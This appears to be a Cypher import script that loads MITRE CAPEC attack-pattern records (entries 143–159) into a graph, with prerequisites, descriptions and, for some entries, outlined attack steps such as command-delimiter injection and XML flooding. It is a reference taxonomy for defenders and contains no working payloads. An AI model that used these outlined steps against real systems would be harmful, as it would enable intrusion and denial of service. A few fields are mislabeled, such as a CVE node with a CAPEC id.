CREATE (:AttackPattern{id: 143, name: "Detect Unpublicized Web Pages", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 88, text: "<div level=\"0\">\n  <p class=\"text\">The targeted web site must include pages within its published tree that are not connected to its tree of links. The sensitivity of the content of these pages determines the severity of this attack.</p>\n</div>"});
CREATE (:Submission{id: 120});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 87});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 120, summary: "OrderedDict([('Text', 'An attacker searches a targeted web site for web pages that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging pages, or otherwise predictable pages within the site tree. For example, if an attacker might be able to notice a pattern in the naming of documents and extrapolate this pattern to discover additional documents that have been created but are no longer externally linked. Using this, the attacker may be able to gain access to information that the targeted site did not intend to make public.')])"});
CREATE (:ResourcesRequired{id: 45, text: "<div level=\"0\">\n  <p class=\"text\">Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.</p>\n</div>"});
CREATE (:AttackPattern{id: 144, name: "Detect Unpublicized Web Services", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 89, text: "<div level=\"0\">\n  <p class=\"text\">The targeted web site must include unpublished services within its web tree. The nature of these services determines the severity of this attack.</p>\n</div>"});
CREATE (:Submission{id: 121});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 88});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 121, summary: "OrderedDict([('Text', 'An attacker searches a targeted web site for web services that have not been publicized. Generally this involves mapping the published web site by spidering through all the published links and then attempt to access well-known debugging or logging services, or otherwise predictable services within the site tree. This attack can be especially dangerous since unpublished but available services may not have adequate security controls placed upon them given that an administrator may believe they are unreachable.')])"});
CREATE (:ResourcesRequired{id: 46, text: "<div level=\"0\">\n  <p class=\"text\">Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common service queries from known paths.</p>\n</div>"});
CREATE (:AttackPattern{id: 145, name: "Checksum Spoofing", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 90, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to intercept a message from the sender (keeping the recipient from getting it), modify it, and send the modified message to the recipient.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 91, text: "<div level=\"0\">\n  <p class=\"text\">The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the attacker can intercept and modify it.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 92, text: "<div level=\"0\">\n  <p class=\"text\">The checksum value must be computable using information known to the attacker. A cryptographic checksum, which uses a key known only to the sender and recipient, would thwart this attack.</p>\n</div>"});
CREATE (:Submission{id: 122});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 122, summary: "OrderedDict([('Text', \"An attacker spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an attacker modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the attacker) in the message. This would prevent the recipient from realizing that a change occurred.\")])"});
CREATE (:ResourcesRequired{id: 47, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to intercept and modify messages between the sender and recipient.</p>\n</div>"});
CREATE (:AttackPattern{id: 146, name: "XML Schema Poisoning", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 93, text: "<div level=\"0\">\n  <p class=\"text\">The schema used by the target application must be improperly secured against unauthorized modification and manipulation.</p>\n</div>"});
CREATE (:Submission{id: 123});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 89});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Description{id: 123, summary: "OrderedDict([('Text', 'An attacker corrupts or modifies the content of XML schema information passed between a client and server for the purpose of undermining the security of the target. XML Schemas provide the structure and content definitions for XML documents. Schema poisoning is the ability to manipulate a schema either by replacing or modifying it to compromise the programs that process documents that use this schema. Possible attacks are denial of service attacks by modifying the schema so that it does not contain required information for subsequent processing. For example, the unaltered schema may require a @name attribute in all submitted documents. If the attacker removes this attribute from the schema then documents created using the new grammar may lack this field, which may cause the processing application to enter an unexpected state or record incomplete data. In addition, manipulation of the data types described in the schema may affect the results of calculations taken by the document reader. For example, a float field could be changed to an int field. Finally, the attacker may change the encoding defined in the schema for certain fields allowing the contents to bypass filters that scan for dangerous strings. For example, the modified schema might us a URL encoding instead of ASCII, and a filter that catches a semicolon (;) might fail to detect its URL encoding (%3B).')])"});
MERGE (:CWE{id: 15});
MERGE (:CWE{id: 472});
CREATE (:ResourcesRequired{id: 48, text: "<div level=\"0\">\n  <p class=\"text\">Access to the schema and the knowledge and ability modify it. Ability to replace or redirect access to the modified schema.</p>\n</div>"});
CREATE (:AttackPattern{id: 147, name: "XML Ping of the Death", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 94, text: "<div level=\"0\">\n  <p class=\"text\">The target must receive and process XML transactions.</p>\n</div>"});
CREATE (:Submission{id: 124});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 124, summary: "OrderedDict([('Text', 'An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the target", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated tool to record all instances of URLs to process XML requests.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how the application processes XML requests.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The URL processes XML requests.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The application does not accept XML requests.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs which process XML requests."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Launch a resource depletion attack", description: "<div level=\"0\">\n  <p class=\"text\">The attacker delivers a large number of small XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Send a large number of crafted small XML messages to the target URL.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker causes the target application denial of service."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:CVE{id: "CAPEC-159", description: "<div level=\"0\">\n  <p class=\"text\">Redirect Access to Libraries</p>\n</div>"});
MERGE (:CWE{id: 400});
MERGE (:CWE{id: 770});
CREATE (:ResourcesRequired{id: 49, text: "<div level=\"0\">\n  <p class=\"text\">Transaction generator(s)/source(s) and ability to cause arrival of messages at the target with sufficient rapidity to overload target. Larger targets may be able to handle large volumes of requests so the attacker may require significant resources (such as a distributed network) to affect the target. However, the resources required of the attacker would be less than in the case of a simple flooding attack against the same target.</p>\n</div>"});
CREATE (:AttackPattern{id: 148, name: "Content Spoofing", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 95, text: "<div level=\"0\">\n  <p class=\"text\">The target must provide content but fail to adequately protect it against modification.</p>\n  <p class=\"text\">The adversary must have the means to alter data to which he/she is not authorized.</p>\n  <p class=\"text\">If the content is to be modified in transit, the adversary must be able to intercept the targeted messages.</p>\n</div>"});
CREATE (:Submission{id: 125});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 90});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 125, summary: "OrderedDict([('Text', \"An adversary modifies content to make it contain something other than what the original content producer intended while keeping the apparent source of the content unchanged. The term content spoofing is most often used to describe modification of web pages hosted by a target to display the adversary's content instead of the owner's content. However, any content can be spoofed, including the content of email messages, file transfers, or the content of other network communication protocols. Content can be modified at the source (e.g. modifying the source file for a web page) or in transit (e.g. intercepting and modifying a message between the sender and recipient). Usually, the adversary will attempt to hide the fact that the content has been modified, but in some cases, such as with web site defacement, this is not necessary. Content Spoofing can lead to malware exposure, financial fraud (if the content governs financial transactions), privacy violations, and other unwanted outcomes.\")])"});
MERGE (:CWE{id: 345});
CREATE (:ResourcesRequired{id: 50, text: "<div level=\"0\">\n  <p class=\"text\">If the content is to be modified in transit, the adversary requires a tool capable of intercepting the target's communication and generating/creating custom packets to impact the communications.</p>\n  <p class=\"text\">In some variants, the targeted content is altered so that all or some of it is redirected towards content published by the attacker (for example, images and frames in the target's web site might be modified to be loaded from a source controlled by the attacker). In these cases, the attacker requires the necessary resources to host the replacement content.</p>\n</div>"});
CREATE (:AttackPattern{id: 149, name: "Explore for Predictable Temporary File Names", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 96, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must create names for temporary files using a predictable procedure, e.g. using sequentially increasing numbers.</p>\n</div>"});
CREATE (:Submission{id: 126});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 91});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 126, summary: "OrderedDict([('Text', 'An attacker explores a target to identify the names and locations of predictable temporary files for the purpose of launching further attacks against the target. This involves analyzing naming conventions and storage locations of the temporary files created by a target application. If an attacker can predict the names of temporary files they can use this information to mount other attacks, such as information gathering and symlink attacks.')])"});
CREATE (:ResourcesRequired{id: 51, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to see the names of the files the target is creating.</p>\n</div>"});
CREATE (:AttackPattern{id: 15, name: "Command Delimiters", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 97, text: "<div level=\"0\">\n  <p class=\"text\">Software's input validation or filtering must not detect and block presence of additional malicious command.</p>\n</div>"});
CREATE (:Submission{id: 127});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 127, summary: "OrderedDict([('Text', \"An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Assess Target Runtime Environment", description: "<div level=\"0\">\n  <p class=\"text\">In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Port mapping using network connection-based software (e.g., nmap, nessus, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Port mapping by exploring the operating system (netstat, sockstat, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">TCP/IP Fingerprinting</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Induce errors to find informative error messages</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The target software accepts connections via the network.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Operating environment (operating system, language, and/or middleware) is correctly identified."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Multiple candidate operating environments are suggested."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Survey the Application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker surveys the target application, possibly as a valid and authenticated user</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spidering web sites for all available links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Inventory all application inputs</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker develops a list of valid inputs</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker develops a list of likely command delimiters."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt delimiters in inputs", description: "<div level=\"0\">\n  <p class=\"text\">The attacker systematically attempts variations of delimiters on known inputs, observing the application's response each time.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Enter command delimiters directly in input fields.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attack step 2 is successful.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "One or more command delimiters for the platform provokes an unexpected response from the software, which can be varied by the attacker based on the input."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Use malicious command delimiters", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses combinations of payload and carefully placed command delimiters to attack the software.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The software performs as expected by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.15.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 146});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 78});
MERGE (:CWE{id: 185});
MERGE (:CWE{id: 93});
MERGE (:CWE{id: 140});
MERGE (:CWE{id: 157});
MERGE (:CWE{id: 138});
MERGE (:CWE{id: 154});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
CREATE (:ResourcesRequired{id: 52, text: "<div level=\"0\">\n  <p class=\"text\">Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.</p>\n</div>"});
CREATE (:AttackPattern{id: 150, name: "Collect Data from Common Resource Locations", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 98, text: "<div level=\"0\">\n  <p class=\"text\">The targeted applications must either expect files to be located at a specific location or, if the location of the files can be configured by the user, the user either failed to move the files from the default location or placed them in a conventional location for files of the given type.</p>\n</div>"});
CREATE (:Submission{id: 128});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 92});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Modification{id: 93});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 24, name: "Common Resource Location Exploration"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 128, summary: "OrderedDict([('Text', \"An adversary exploits well-known locations for resources for the purposes of undermining the security of the target. In many, if not most systems, files and resources are organized in a default tree structure. This can be useful for adversaries because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may not be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Adversaries can take advantage of this to commit other types of attacks.\")])"});
CREATE (:ResourcesRequired{id: 53, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most variants of this attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.</p>\n</div>"});
CREATE (:AttackPattern{id: 151, name: "Identity Spoofing", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 99, text: "<div level=\"0\">\n  <p class=\"text\">The identity associated with the message or resource must be removable or modifiable in an undetectable way.</p>\n</div>"});
CREATE (:Submission{id: 129});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 94});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 129, summary: "OrderedDict([('Text', 'Identity Spoofing refers to the action of assuming (i.e., taking on) the identity of some other entity (human or non-human) and then using that identity to accomplish a goal. An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials. Alternatively, an adversary may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. Identity Spoofing attacks need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the adversary attempts to change the apparent identity. This attack differs from Content Spoofing attacks where the adversary does not wish to change the apparent identity of the message but instead wishes to change what the message says. In an Identity Spoofing attack, the adversary is attempting to change the identity of the content.')])"});
MERGE (:CWE{id: 287});
CREATE (:ResourcesRequired{id: 54, text: "<div level=\"0\">\n  <p class=\"text\">No special resource are required for most variants of this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 153, name: "Input Data Manipulation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 100, text: "<div level=\"0\">\n  <p class=\"text\">The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.</p>\n</div>"});
CREATE (:Submission{id: 130});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 95});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 130, summary: "OrderedDict([('Text', \"An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.\")])"});
CREATE (:ResourcesRequired{id: 55, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most variants of this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 154, name: "Resource Location Spoofing", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 101, text: "<div level=\"0\">\n  <p class=\"text\">None. All applications rely on file paths and therefore, in theory, they or their resources could be affected by this type of attack.</p>\n</div>"});
CREATE (:Submission{id: 131});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 96});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Modification{id: 97});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit"});
CREATE (:Description{id: 131, summary: "OrderedDict([('Text', 'An adversary, in an attempt to leverage an alternate or malicious resource, causes an application to look for a resource in an unintended location. This differs from a resource manipulation attack in which the contents of the resource are affected or where the resources themselves are physically altered or moved. Instead, this attack simply concerns itself with the paths used to find or create resources.')])"});
CREATE (:ResourcesRequired{id: 56, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required for most variants of this attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 155, name: "Screen Temporary Files for Sensitive Information", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 102, text: "<div level=\"0\">\n  <p class=\"text\">The target application must utilize temporary files and must fail to adequately secure them against other parties reading them.</p>\n</div>"});
CREATE (:Submission{id: 132});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 98});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 132, summary: "OrderedDict([('Text', \"An attacker exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an attacker might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the attacker could recover this from the web cache.\")])"});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 57, text: "<div level=\"0\">\n  <p class=\"text\">Because some application may have a large number of temporary files and/or these temporary files may be very large, an attacker may need tools that help them quickly search these files for sensitive information. If the attacker can simply copy the files to another location and if the speed of the search is not important, the attacker can still perform the attack without any special resources.</p>\n</div>"});
CREATE (:AttackPattern{id: 157, name: "Sniffing Attacks", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 103, text: "<div level=\"0\">\n  <p class=\"text\">Any target that transmits readable data could be attacked in this way. Cryptographic techniques that render a data-stream unreadable can thwart this type of attack.</p>\n</div>"});
CREATE (:Submission{id: 133});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 99});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 133, summary: "OrderedDict([('Text', 'An attacker monitors information transmitted between logical or physical nodes of a network. The attacker need not be able to prevent reception or change content but must simply be able to observe and read the traffic. The attacker might precipitate or indirectly influence the content of the observed transaction, but the attacker is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the attacker can listen to the contents between the sender and recipient.')])"});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 58, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the attacker may require special equipment and/or require that this equipment be placed in specific locations.</p>\n</div>"});
CREATE (:AttackPattern{id: 158, name: "Sniffing Network Traffic", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 104, text: "<div level=\"0\">\n  <p class=\"text\">Any target that transmits readable data over a public or multicast network could be attacked in this way.</p>\n</div>"});
CREATE (:Submission{id: 134});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 100});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Modification{id: 101});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:Description{id: 134, summary: "OrderedDict([('Text', \"An adversary monitors network traffic between nodes of a public or multicast network in an attempt to capture sensitive information. The adversary doesn't prevent reception or change content but simply observes and reads the traffic. The attacker might precipitate or indirectly influence the content of the observed transaction, but the attacker is never the intended recipient of the information.\")])"});
MERGE (:Reference{local_id: "R.158.1", author: "ATT&CK Project", title: "Network Sniffing (1040)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Network_sniffing"});
MERGE (:CWE{id: 311});
CREATE (:ResourcesRequired{id: 59, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to intercept the transmissions containing the data of interest. Depending on the network topology between the recipients, placement of listening equipment may be challenging (such as if both the sender and recipient are members of a single subnet and therefore the listener must also be attached to that subnet.</p>\n</div>"});
CREATE (:AttackPattern{id: 159, name: "Redirect Access to Libraries", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 105, text: "<div level=\"0\">\n  <p class=\"text\">The target must utilize external libraries and must fail to verify the integrity of these libraries before using them.</p>\n</div>"});
CREATE (:Submission{id: 135});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 102});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 135, summary: "OrderedDict([('Text', \"An attacker exploits the execution flow of a call to an external library to point to an attacker supplied library or code base, allowing the attacker to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an attacker can redirect an application's attempts to access these libraries to other libraries that the attacker supplies, the attacker will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify target general susceptibility", description: "<div level=\"0\">\n  <p class=\"text\">An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.</p>\n</div>"});
